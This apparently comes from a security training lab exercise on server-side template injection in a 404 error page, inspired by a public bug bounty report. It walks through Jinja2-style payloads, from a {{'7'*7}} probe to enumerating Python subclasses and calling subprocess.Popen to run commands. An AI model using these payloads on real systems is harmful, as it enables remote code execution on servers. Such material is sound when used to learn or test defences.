payload: {{'7'*7}}


This exercise was inspired by the following Hackerone report: https://hackerone.com/reports/125980. In this exercise, the bug is located in the 404 error management.

This report gives you the foundation to:

    Test {{'7'*7}}
    Get code execution:

{{''.__class__.mro()[1].__subclasses__()}} 

Check the report carefully, as you can see that the `__` are hidden due to the processing of the data as Markdown in the initial report.

You may need to change the value 1 to get the list of interesting functions. Once you get it, you will need to find one that will give you code execution. You can use the following payload to get access to <class 'subprocess.Popen'>:

{{''.__class__.mro()[1].__subclasses__()[X]}}

Where X is the integer you need to find.

Finally, you can call this method using:

{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}

Where:

    X was found previously.
    COMMAND is the command you want to run.
